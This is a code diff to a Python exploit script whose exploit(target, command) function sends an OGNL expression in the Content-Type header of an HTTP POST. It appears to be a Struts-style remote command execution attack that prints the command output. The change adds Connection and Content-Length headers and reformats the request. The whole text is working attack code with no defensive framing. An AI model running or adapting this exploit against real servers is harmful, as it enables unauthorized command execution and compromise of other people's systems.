@@ -76,12 +76,19 @@ def exploit(target, command):
 
     headers = {
         "Content-Type": ognl,
-        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
+        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
+        "Connection": "close",
     }
 
     try:
-        r = requests.post(f"{target}/", headers=headers, data="",
-                         timeout=15, verify=False)
+        payload_body = ""
+        r = requests.post(
+            f"{target}/",
+            headers={**headers, "Content-Length": "0"},
+            data=payload_body,
+            timeout=15,
+            verify=False,
+        )
         if r.status_code == 200 and r.text.strip():
             print(f"[+] Command executed successfully!")
             print(f"[+] Output:\n{r.text.strip()}")
